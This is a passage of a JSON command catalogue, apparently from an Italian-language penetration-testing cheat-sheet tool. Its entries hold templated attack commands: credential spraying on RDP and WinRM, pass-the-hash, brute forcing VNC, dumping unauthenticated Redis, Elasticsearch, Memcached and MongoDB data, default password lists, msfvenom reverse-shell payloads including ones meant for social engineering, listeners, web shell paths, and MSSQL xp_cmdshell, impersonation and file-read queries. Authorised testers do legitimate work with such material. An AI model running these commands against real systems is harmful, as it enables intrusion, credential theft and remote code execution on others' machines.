    "description": "Verifica credenziali RDP in massa e cattura uno screenshot della schermata di login o della sessione (`--screenshot`).",
    "platform": "linux",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "rdp"
    ],
    "tags": [
      "nxc",
      "netexec",
      "rdp"
    ],
    "template": "nxc rdp <ip> -u '<user>' -p '<password>'",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "administrator"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Check accesso",
        "template": "nxc rdp <ip> -u '<user>' -p '<password>'",
        "description": "Conferma se le credenziali sono valide su RDP."
      },
      {
        "id": "screenshot",
        "label": "Screenshot",
        "template": "nxc rdp <ip> -u '<user>' -p '<password>' --screenshot",
        "description": "Salva uno screenshot della sessione RDP."
      },
      {
        "id": "nla-screenshot",
        "label": "Screenshot senza NLA",
        "template": "nxc rdp <ip> --nla-screenshot",
        "description": "Se NLA è disattivato, cattura la schermata di login senza credenziali."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — 3389 Pentesting RDP",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rdp.html"
      }
    ]
  },
  {
    "id": "psql-login",
    "name": "psql — login & enum PostgreSQL",
    "category": "service-enum",
    "subcategory": "postgresql",
    "group": "Connection",
    "description": "Apre una sessione PostgreSQL e ne enumera database e ruoli. Le credenziali di default `postgres:postgres` (o `postgres` senza password) sono frequenti. `\\l` elenca i database, `\\du` i ruoli: cerca un ruolo con attributo Superuser, che apre la strada a lettura file e RCE.",
    "note": "# Credenziali di default\n`postgres:postgres` · `postgres:` (vuota) · `postgres:password` · `postgres:admin` · `admin:admin`.",
    "platform": "cross-platform",
    "requires": [
      "password"
    ],
    "protocols": [
      "postgresql"
    ],
    "tags": [
      "postgres",
      "psql",
      "enum"
    ],
    "template": "PGPASSWORD='<password>' psql -h <ip> -U <user> -d postgres",
    "params": [
      {
        "key": "ip",
        "label": "IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Login",
        "template": "PGPASSWORD='<password>' psql -h <ip> -U <user> -d postgres",
        "description": "Sessione interattiva. Se entra, prosegui con `\\l` e `\\du`."
      },
      {
        "id": "enum",
        "label": "Database & ruoli",
        "template": "# elenca i database dell'istanza\nPGPASSWORD='<password>' psql -h <ip> -U <user> -d postgres -c '\\l'\n\n# elenca ruoli e privilegi\nPGPASSWORD='<password>' psql -h <ip> -U <user> -d postgres -c '\\du'",
        "description": "Elenca database e ruoli in modo non interattivo. Un ruolo `Superuser` = lettura file e RCE possibili."
      },
      {
        "id": "defcreds",
        "label": "Default creds",
        "template": "psql -h <ip> -U postgres -d postgres",
        "description": "Prova l'accesso con l'utente `postgres` senza password: misconfigurazione comune."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — 5432 PostgreSQL",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql"
      }
    ]
  },
  {
    "id": "vnc-enum",
    "name": "VNC — nmap enum",
    "category": "service-enum",
    "subcategory": "vnc",
    "group": "Enumeration",
    "description": "VNC è un desktop remoto grafico: la porta 5900 serve il display principale, la 5800 offre lo stesso visualizzatore come applet Java via HTTP. La prima cosa da controllare è il tipo di autenticazione, perché molte telecamere e dispositivi IoT espongono VNC senza alcuna password.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "vnc"
    ],
    "tags": [
      "vnc",
      "nmap"
    ],
    "template": "nmap -p5800,5900 --script vnc-info,vnc-title,realvnc-auth-bypass <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "refs": [
      {
        "label": "HackTricks — Pentesting VNC",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-vnc.html"
      }
    ],
    "note": "# Opzioni\n- `vnc-info` mostra la versione del protocollo e i tipi di autenticazione (nessuna, VNC, Tight)\n- `realvnc-auth-bypass` verifica un bypass di autenticazione noto di RealVNC"
  },
  {
    "id": "vnc-connect",
    "name": "VNC — connetti",
    "category": "service-enum",
    "subcategory": "vnc",
    "group": "Access",
    "description": "Connessione al desktop VNC. Se `vnc-info` riporta auth `None` l'accesso avviene senza password, situazione comune su telecamere e dispositivi IoT.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "vnc"
    ],
    "tags": [
      "vnc",
      "vncviewer",
      "access"
    ],
    "template": "vncviewer <ip>:5900",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "vncviewer",
        "template": "vncviewer <ip>:5900",
        "description": "Connessione diretta al display:0. In assenza di autenticazione l'accesso è immediato."
      },
      {
        "id": "noneauth",
        "label": "MSF check no-auth",
        "template": "msfconsole -q -x \"use auxiliary/scanner/vnc/vnc_none_auth; set RHOSTS <ip>; run; exit\"",
        "description": "Verifica se il VNC accetta connessioni senza password."
      }
    ],
    "note": "# Porta 5800 (vnc-http)\nÈ il viewer VNC servito come applet Java via HTTP: apri `http://<ip>:5800` nel browser. Indica un VNC in ascolto sulla 5900.\n# Password VNC salvata\nUna password VNC memorizzata (config o registro) è cifrata in DES con una chiave fissa nota: decifrala con `vncpwd <file>`.\n# Credenziali di default\nVNC non usa username, solo una password. Molto spesso non c'è alcuna autenticazione (telecamere/IoT). Password deboli comuni: `password` · `admin` · `1234` · `vnc` · (vuota).",
    "refs": [
      {
        "label": "HackTricks — Pentesting VNC",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-vnc.html"
      }
    ]
  },
  {
    "id": "vnc-brute",
    "name": "VNC — brute password",
    "category": "service-enum",
    "subcategory": "vnc",
    "group": "Access",
    "description": "VNC usa solo la password, senza nome utente. Prova a tentativi le password da una lista.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "vnc"
    ],
    "tags": [
      "vnc",
      "hydra",
      "brute"
    ],
    "template": "hydra -P /usr/share/wordlists/rockyou.txt vnc://<ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "hydra",
        "label": "hydra",
        "template": "hydra -P /usr/share/wordlists/rockyou.txt vnc://<ip>",
        "description": "Brute della sola password (VNC non ha username)."
      },
      {
        "id": "msf",
        "label": "Metasploit",
        "template": "msfconsole -q -x \"use auxiliary/scanner/vnc/vnc_login; set RHOSTS <ip>; set PASS_FILE /usr/share/wordlists/rockyou.txt; run; exit\"",
        "description": "`vnc_login` con wordlist."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — Pentesting VNC",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-vnc.html"
      }
    ],
    "note": "# Opzioni\n- con hydra si usa il modulo `vnc` e solo `-P` (niente `-l`, non c'e l'utente)\n- in alternativa il modulo `vnc_login` di Metasploit"
  },
  {
    "id": "evil-winrm",
    "name": "evil-winrm — shell",
    "category": "service-enum",
    "subcategory": "winrm",
    "group": "Shell",
    "description": "Shell PowerShell interattiva su WinRM, il protocollo di gestione remota di Windows sulle porte 5985 e 5986. È il metodo più pulito quando l'account appartiene al gruppo Remote Management Users, perché non crea servizi né scrive file sul target. L'autenticazione accetta password, hash NTLM per il Pass-the-Hash oppure ticket Kerberos.",
    "platform": "linux",
    "requires": [
      "password",
      "hash",
      "ticket"
    ],
    "protocols": [
      "winrm"
    ],
    "tags": [
      "evil-winrm",
      "winrm",
      "shell"
    ],
    "template": "evil-winrm -i <ip> -u '<user>' -p '<password>'",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "administrator"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "hash",
        "label": "Hash NTLM",
        "placeholder": "aad3b435...",
        "ctx": "hash"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Password",
        "template": "evil-winrm -i <ip> -u '<user>' -p '<password>'",
        "description": "Auth con password."
      },
      {
        "id": "hash",
        "label": "Pass-the-Hash",
        "template": "evil-winrm -i <ip> -u '<user>' -H '<hash>'",
        "description": "Auth con hash NTLM (PtH)."
      },
      {
        "id": "updownload",
        "label": "Upload/Download",
        "template": "evil-winrm -i <ip> -u '<user>' -p '<password>' -s /opt/scripts/ -e /opt/exe/",
        "description": "Nella shell usa `upload`/`download <file>`. -s monta una cartella di script PS, -e una di.exe da caricare in memoria."
      }
    ]
  },
  {
    "id": "nxc-winrm",
    "name": "nxc winrm — check & exec",
    "category": "service-enum",
    "subcategory": "winrm",
    "group": "Shell",
    "description": "Verifica se le credenziali danno accesso WinRM: il flag `(Pwn3d!)` indica che la shell è ottenibile. `-x` esegue un comando al volo.",
    "platform": "linux",
    "requires": [
      "password",
      "hash",
      "ticket"
    ],
    "protocols": [
      "winrm"
    ],
    "tags": [
      "nxc",
      "netexec",
      "winrm"
    ],
    "template": "nxc winrm <ip> -u '<user>' -p '<password>'",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "administrator"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "hash",
        "label": "Hash NTLM",
        "placeholder": "aad3b435...",
        "ctx": "hash"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Check accesso",
        "template": "nxc winrm <ip> -u '<user>' -p '<password>'",
        "description": "Conferma l'accesso WinRM: `(Pwn3d!)` indica che la shell è ottenibile."
      },
      {
        "id": "hash",
        "label": "Pass-the-Hash",
        "template": "nxc winrm <ip> -u '<user>' -H '<hash>'",
        "description": "Verifica l’accesso con hash NTLM."
      },
      {
        "id": "exec",
        "label": "Esegui comando",
        "template": "nxc winrm <ip> -u '<user>' -p '<password>' -x 'whoami'",
        "description": "Esegue un comando senza aprire una shell interattiva."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — 5985 Pentesting WinRM",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/5985-5986-pentesting-winrm.html"
      }
    ]
  },
  {
    "id": "redis-enum",
    "name": "redis-cli — enum Redis",
    "category": "service-enum",
    "subcategory": "redis",
    "group": "Enumeration",
    "description": "Si connette al server Redis e ne legge stato e contenuto. Se risponde senza chiedere una password l'istanza è aperta: da lì `KEYS *` elenca tutte le chiavi e `GET` ne legge il valore, spesso token di sessione, credenziali o config lasciate in cache.",
    "note": "# Credenziali di default\nRedis di default non ha autenticazione. Se risponde `NOAUTH`, prova i `requirepass` deboli: `foobared` (default storico) · `redis` · `password` · `admin`.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "redis"
    ],
    "tags": [
      "redis",
      "redis-cli",
      "enum"
    ],
    "template": "redis-cli -h <ip> INFO server",
    "params": [
      {
        "key": "ip",
        "label": "IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "key",
        "label": "Chiave",
        "placeholder": "session:1"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "INFO / connect",
        "template": "redis-cli -h <ip> INFO server",
        "description": "Legge versione e ruolo del server. Una risposta senza errore di auth conferma che l'istanza è raggiungibile e non protetta."
      },
      {
        "id": "keys",
        "label": "Chiavi & valori",
        "template": "# elenca tutte le chiavi presenti sull'istanza\nredis-cli -h <ip> KEYS '*'\n\n# legge il valore della chiave scelta\nredis-cli -h <ip> GET <key>",
        "description": "Elenca tutte le chiavi e ne legge una. Cerca sessioni, credenziali applicative e configurazioni salvate in cache."
      },
      {
        "id": "auth",
        "label": "Con password",
        "template": "redis-cli -h <ip> -a '<password>' INFO",
        "description": "Autentica quando `requirepass` è impostato. Le password deboli o di default come `foobared` sono comuni."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — 6379 Redis",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis"
      }
    ]
  },
  {
    "id": "elastic-enum",
    "name": "Elasticsearch — enum HTTP",
    "category": "service-enum",
    "subcategory": "elastic",
    "group": "Enumeration",
    "description": "Elasticsearch espone tutto via API REST su HTTP. `_cat/indices` elenca gli indici con il numero di documenti, poi `_search` ne dumpa il contenuto. Un 200 senza credenziali significa istanza aperta: gli indici contengono spesso log e dati applicativi sensibili.",
    "note": "# Credenziali di default\nCon security/x-pack attivo: `elastic:changeme` (default storico) · `elastic:elastic` · `kibana:changeme`. Spesso comunque esposto senza auth.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "elastic",
      "http"
    ],
    "tags": [
      "elasticsearch",
      "elastic",
      "http"
    ],
    "template": "curl -s 'http://<ip>:9200/_cat/indices?v'",
    "params": [
      {
        "key": "ip",
        "label": "IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "index",
        "label": "Indice",
        "placeholder": "users"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Indici",
        "template": "curl -s 'http://<ip>:9200/_cat/indices?v'",
        "description": "Elenca gli indici. La colonna `docs.count` dice quanti documenti contiene ciascuno."
      },
      {
        "id": "search",
        "label": "Dump indice",
        "template": "curl -s 'http://<ip>:9200/<index>/_search?pretty&size=100'",
        "description": "Dumpa i primi 100 documenti di un indice. Alza `size` per estrarne di più."
      },
      {
        "id": "health",
        "label": "Cluster & versione",
        "template": "# banner del nodo: versione e nome del cluster\ncurl -s 'http://<ip>:9200/'\n\n# stato di salute del cluster\ncurl -s 'http://<ip>:9200/_cluster/health?pretty'",
        "description": "Legge versione (per cercare CVE, es. RCE su vecchie release) e stato del cluster."
      }
    ]
  },
  {
    "id": "memcached-enum",
    "name": "Memcached — dump cache",
    "category": "service-enum",
    "subcategory": "memcached",
    "group": "Enumeration",
    "description": "Memcached parla un protocollo testuale su TCP 11211 senza autenticazione. `stats` dà una panoramica, `stats items` più `cachedump` elencano le chiavi memorizzate e `get` ne legge il valore. I valori in cache contengono a volte sessioni utente o credenziali.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "memcached"
    ],
    "tags": [
      "memcached",
      "cache",
      "enum"
    ],
    "template": "memcstat --servers=<ip>",
    "params": [
      {
        "key": "ip",
        "label": "IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "slab",
        "label": "Slab ID",
        "placeholder": "1"
      },
      {
        "key": "key",
        "label": "Chiave",
        "placeholder": "session"
      }
    ],
    "variants": [
      {
        "id": "stats",
        "label": "Stats",
        "template": "# statistiche del server tramite client libmemcached\nmemcstat --servers=<ip>\n\n# stesse statistiche senza libmemcached, parlando il protocollo a mano\necho -e 'stats\\r' | nc -q1 <ip> 11211",
        "description": "Panoramica del server: numero di elementi in cache e uptime. Conferma che risponde senza auth."
      },
      {
        "id": "keys",
        "label": "Chiavi & valori",
        "template": "# elenca gli slab con le chiavi memorizzate\necho -e 'stats items\\r' | nc -q1 <ip> 11211\n\n# dump delle chiavi di uno slab\necho -e 'stats cachedump <slab> 100\\r' | nc -q1 <ip> 11211\n\n# legge il valore della chiave scelta\necho -e 'get <key>\\r' | nc -q1 <ip> 11211",
        "description": "Elenca gli slab, ne dumpa le chiavi e legge un valore. Cerca chiavi con nomi tipo `session` o `user`."
      }
    ]
  },
  {
    "id": "mongo-enum",
    "name": "mongosh — enum MongoDB",
    "category": "service-enum",
    "subcategory": "mongodb",
    "group": "Enumeration",
    "description": "Si connette a MongoDB, che è spesso esposto senza autenticazione, ed elenca database e collezioni per poi dumpare i documenti. I dati sono in chiaro e contengono di frequente utenti, hash e token applicativi. Con installazioni vecchie il client si chiama `mongo` invece di `mongosh`.",
    "note": "# Credenziali di default\nDi norma nessuna autenticazione. Se attiva: `admin:admin` · `root:root` · `mongo:mongo`. Prova anche il database `admin` con `--authenticationDatabase admin`.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "mongodb"
    ],
    "tags": [
      "mongodb",
      "mongosh",
      "nosql"
    ],
    "template": "mongosh --host <ip> --quiet --eval 'db.adminCommand({listDatabases:1})'",
    "params": [
      {
        "key": "ip",
        "label": "IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "db",
        "label": "Database",
        "placeholder": "app"
      },
      {
        "key": "coll",
        "label": "Collezione",
        "placeholder": "users"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Database",
        "template": "mongosh --host <ip> --quiet --eval 'db.adminCommand({listDatabases:1})'",
        "description": "Elenca i database senza auth. Una risposta valida conferma l'esposizione anonima."
      },
      {
        "id": "collections",
        "label": "Collezioni & dump",
        "template": "# elenca le collection del database\nmongosh --host <ip>/<db> --quiet --eval 'db.getCollectionNames()'\n\n# stampa i documenti della collection scelta\nmongosh --host <ip>/<db> --quiet --eval 'db.<coll>.find().pretty()'",
        "description": "Elenca le collezioni di un database e dumpa i documenti di una di esse. Cerca la collezione `users` per credenziali."
      }
    ]
  },
  {
    "id": "msfvenom",
    "name": "msfvenom — genera payload",
    "category": "exploitation",
    "subcategory": "payloads",
    "group": "Reverse Shells",
    "description": "Genera una reverse shell standalone nel formato adatto al target:\n- `.elf` = Linux\n- `.exe`/`.dll` = Windows\n- `.war` = Tomcat\n- `.aspx` = IIS\n- `.msi` = AlwaysInstallElevated\n- `.hta` = social engineering",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [],
    "tags": [
      "msfvenom",
      "payload",
      "reverse-shell"
    ],
    "template": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f elf -o shell.elf",
    "params": [
      {
        "key": "lhost",
        "label": "LHOST",
        "placeholder": "10.10.14.5"
      },
      {
        "key": "lport",
        "label": "LPORT",
        "placeholder": "4444"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Linux ELF",
        "template": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f elf -o shell.elf",
        "description": "Binario Linux, che richiede `chmod +x shell.elf` prima dell'esecuzione."
      },
      {
        "id": "exe",
        "label": "Windows EXE",
        "template": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe -o shell.exe",
        "description": "Eseguibile Windows x64."
      },
      {
        "id": "dll",
        "label": "Windows DLL",
        "template": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f dll -o evil.dll",
        "description": "Per DLL hijacking / sideloading."
      },
      {
        "id": "war",
        "label": "WAR (Tomcat)",
        "template": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f war -o shell.war",
        "description": "Da caricare sul Tomcat Manager."
      },
      {
        "id": "aspx",
        "label": "ASPX (IIS)",
        "template": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f aspx -o shell.aspx",
        "description": "Web shell per IIS / ASP.NET."
      },
      {
        "id": "msi",
        "label": "MSI",
        "template": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f msi -o shell.msi",
        "description": "Per abusare di AlwaysInstallElevated (`msiexec /quiet /i shell.msi`)."
      },
      {
        "id": "hta",
        "label": "HTA",
        "template": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f hta-psh -o shell.hta",
        "description": "HTML Application per social engineering."
      }
    ],
    "note": "# Staged o stageless\nUn payload con `/` nel nome (`.../meterpreter/reverse_tcp`) è staged e richiede l'handler Metasploit; uno con `_` (`..._reverse_tcp`) è stageless e si aggancia anche a un semplice nc. Scegli il listener di conseguenza.\n# Opzioni utili\n- `-f <formato>` decide il tipo di file (elf, exe, dll, war, aspx, raw)\n- `-b '\\x00\\x0a'` esclude i bad char; `-e` ed `-i` (encoder, iterazioni) ormai non bastano contro gli EDR moderni\n- `LHOST` è il tuo IP, `LPORT` la porta su cui ascolta il listener\n# Prossimo passo\nAvvia il listener giusto PRIMA di far partire il payload, poi trasferisci ed esegui il file sul target."
  },
  {
    "id": "nc-listen",
    "name": "nc — listener",
    "category": "exploitation",
    "subcategory": "listeners",
    "group": "Netcat",
    "description": "Listener TCP che riceve la reverse shell. Va avviato prima di far partire il payload sul target, e resta in attesa senza restituire il prompt. `rlwrap` davanti al comando aggiunge cronologia e frecce direzionali alla shell ricevuta, in attesa della stabilizzazione vera con un PTY.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [],
    "tags": [
      "nc",
      "listener"
    ],
    "template": "rlwrap nc -lvnp <lport>",
    "params": [
      {
        "key": "lport",
        "label": "LPORT",
        "placeholder": "4444"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "rlwrap",
        "template": "rlwrap nc -lvnp <lport>",
        "description": "Con `rlwrap`: frecce e history nella shell."
      },
      {
        "id": "plain",
        "label": "Plain",
        "template": "nc -lvnp <lport>",
        "description": "Netcat semplice."
      }
    ],
    "note": "# Errori comuni\nnc aggancia solo payload stageless e shell dirette: per un meterpreter staged serve l'handler Metasploit. La shell che arriva è grezza, senza TTY.\n# Prossimo passo\nAppena arriva la connessione, stabilizza la shell con un PTY (vedi Stabilizza shell)."
  },
  {
    "id": "msf-handler",
    "name": "msfconsole — multi/handler",
    "category": "exploitation",
    "subcategory": "listeners",
    "group": "Metasploit",
    "description": "Handler di Metasploit che riceve le sessioni dai payload meterpreter o staged. Il payload configurato nell'handler deve combaciare esattamente con quello generato da msfvenom, altrimenti la sessione non si aggancia. Rispetto a un semplice netcat offre gestione di più sessioni, migrazione di processo e i moduli post.",
    "note": "# Il payload deve combaciare\nUn payload staged come `windows/x64/meterpreter/reverse_tcp` richiede l'handler dello stesso tipo. Uno stageless come `..._reverse_tcp` va con l'handler stageless corrispondente: incrociarli fa fallire l'aggancio senza errori chiari.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [],
    "tags": [
      "metasploit",
      "handler",
      "meterpreter"
    ],
    "template": "msfconsole -q -x \"use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <lhost>; set LPORT <lport>; run\"",
    "params": [
      {
        "key": "lhost",
        "label": "LHOST",
        "placeholder": "10.10.14.5"
      },
      {
        "key": "lport",
        "label": "LPORT",
        "placeholder": "4444"
      }
    ]
  },
  {
    "id": "kali-webshells",
    "name": "Web shell preinstallate (Kali)",
    "category": "exploitation",
    "subcategory": "webshells",
    "group": "Percorsi Kali",
    "description": "Web shell già presenti su Kali, da caricare via file upload o LFI. `LHOST` e `LPORT` vanno impostati dentro `php-reverse-shell.php` prima dell'uso.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "webshell",
      "kali",
      "laudanum",
      "nishang"
    ],
    "template": "/usr/share/webshells/php/php-reverse-shell.php",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "PHP reverse",
        "template": "/usr/share/webshells/php/php-reverse-shell.php",
        "description": "Reverse shell PHP (modifica IP/porta nel file)."
      },
      {
        "id": "backdoor",
        "label": "PHP backdoor",
        "template": "/usr/share/webshells/php/simple-backdoor.php",
        "description": "Web shell `?cmd=` minimale."
      },
      {
        "id": "laudanum",
        "label": "Laudanum",
        "template": "/usr/share/webshells/laudanum/",
        "description": "Collezione PHP/ASP/ASPX/JSP."
      },
      {
        "id": "nishang",
        "label": "Nishang Antak",
        "template": "/usr/share/nishang/Antak-WebShell/",
        "description": "Web shell PowerShell (ASPX)."
      }
    ],
    "note": "# Dove sono su Kali\nStanno in `/usr/share/webshells/` (php, asp, aspx, jsp, perl) e in `/usr/share/laudanum/`; Nishang è in `/usr/share/nishang/`.\n# Errori comuni\n`php-reverse-shell.php` va editato con il tuo IP e porta prima di caricarlo, e deve essere servito dal web server con l'estensione giusta in una cartella eseguibile.\n# Prossimo passo\nCon la reverse shell tieni un listener in ascolto; con la backdoor `?cmd=` hai RCE diretta da browser o curl, da promuovere poi a reverse shell."
  },
  {
    "id": "shell-pty",
    "name": "Stabilizza shell (PTY)",
    "category": "exploitation",
    "subcategory": "shell-stab",
    "group": "TTY Upgrade",
    "description": "Trasforma una shell grezza in una TTY interattiva (Ctrl+C, history, editor). La sequenza completa è nella variante apposita.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "pty",
      "tty",
      "upgrade"
    ],
    "template": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "Python PTY",
        "template": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
        "description": "Primo passo: spawn di una `bash` con PTY."
      },
      {
        "id": "full",
        "label": "Upgrade completo",
        "template": "# spawn di una PTY dentro la shell corrente\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n\n# sospendi con Ctrl+Z, passa il terminale in raw e riprendi la shell\nstty raw -echo; fg\n\n# dichiara il tipo di terminale, così clear e gli editor funzionano\nexport TERM=xterm",
        "description": "Dopo lo spawn: `Ctrl+Z`, poi `stty raw -echo; fg`, infine `export TERM=xterm` per una TTY piena."
      },
      {
        "id": "script",
        "label": "script",
        "template": "script /dev/null -c bash",
        "description": "Alternativa se manca Python."
      },
      {
        "id": "langs",
        "label": "Altri linguaggi",
        "template": "perl -e 'exec \"/bin/sh\";'",
        "description": "Se manca Python: anche `ruby`/`lua`/`awk` con un `exec \"/bin/sh\"`."
      }
    ],
    "note": "# Sequenza completa\nLa variante Upgrade completo fa: spawn del PTY, poi `Ctrl+Z`, quindi `stty raw -echo; fg`, infine `export TERM=xterm`. Senza l'ultimo passo editor e clear non funzionano.\n# Errori comuni\nSe il terminale resta sporco dopo un crash, `reset` lo ripulisce. Imposta le dimensioni con `stty rows <r> cols <c>` (leggile con `stty size` nel tuo terminale) per usare bene gli editor a schermo intero."
  },
  {
    "id": "mssql-xpcmdshell",
    "name": "MSSQL — xp_cmdshell RCE",
    "category": "exploitation",
    "subcategory": "infrastructure",
    "group": "MSSQL (1433)",
    "description": "`xp_cmdshell` esegue comandi del sistema operativo con i privilegi dell'account di servizio SQL, che spesso è un account di dominio. È disabilitato di default e va riattivato con `sp_configure`, operazione che richiede il ruolo sysadmin. L'output del comando torna nella griglia dei risultati.",
    "note": "# Se la riconfigurazione fallisce\nIl messaggio `SQL Server blocked access to procedure 'sys.xp_cmdshell'` indica che l'utente non è sysadmin. In quel caso la via è l'impersonation di un login sysadmin, oppure la cattura del NetNTLMv2 con `xp_dirtree` verso una share controllata.",
    "platform": "cross-platform",
    "requires": [
      "password"
    ],
    "protocols": [
      "mssql"
    ],
    "tags": [
      "mssql",
      "xp_cmdshell",
      "rce"
    ],
    "template": "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell '<cmd>';",
    "params": [
      {
        "key": "cmd",
        "label": "Command",
        "placeholder": "whoami"
      }
    ]
  },
  {
    "id": "mssql-impersonate",
    "name": "MSSQL — impersonate sa",
    "category": "exploitation",
    "subcategory": "infrastructure",
    "group": "MSSQL (1433)",
    "description": "La scalata di privilegi in MSSQL non richiede per forza il ruolo sysadmin: se un login di basso privilegio ha il permesso `IMPERSONATE` su un altro, può assumerne l'identità con `EXECUTE AS LOGIN`. Impersonando `sa` o un qualsiasi sysadmin si arriva comunque a xp_cmdshell. I login impersonabili si individuano con la query dedicata nella scheda dei ruoli.",
    "note": "# Ritorno all'identità originale\nDopo `EXECUTE AS LOGIN = 'sa'` il contesto resta cambiato per tutta la sessione: `REVERT` riporta al login di partenza. `SELECT SYSTEM_USER` conferma in ogni momento chi si è.",
    "platform": "cross-platform",
    "requires": [
      "password"
    ],
    "protocols": [
      "mssql"
    ],
    "tags": [
      "mssql",
      "impersonate"
    ],
    "template": "EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER; EXEC xp_cmdshell '<cmd>'; REVERT;",
    "params": [
      {
        "key": "cmd",
        "label": "Command",
        "placeholder": "whoami"
      }
    ]
  },
  {
    "id": "mssql-readfile",
    "name": "MSSQL — leggi file (OPENROWSET)",
    "category": "exploitation",
    "subcategory": "infrastructure",
    "group": "MSSQL (1433)",
    "description": "Legge un file dal filesystem del server SQL come singolo blob di testo. Serve il permesso `ADMINISTER BULK OPERATIONS` o il ruolo `bulkadmin` (i sysadmin li hanno). Comodo per `web.config`, config, chiavi, flag.",
    "platform": "cross-platform",
    "requires": [
      "password"
    ],
    "protocols": [
      "mssql"
    ],
    "tags": [
      "mssql",
      "file-read",
      "openrowset"
    ],
    "template": "SELECT * FROM OPENROWSET(BULK N'<path>', SINGLE_CLOB) AS Contents;",
    "params": [
      {
        "key": "path",
        "label": "Path file",
        "placeholder": "C:\\Windows\\System32\\drivers\\etc\\hosts"
      }
    ],
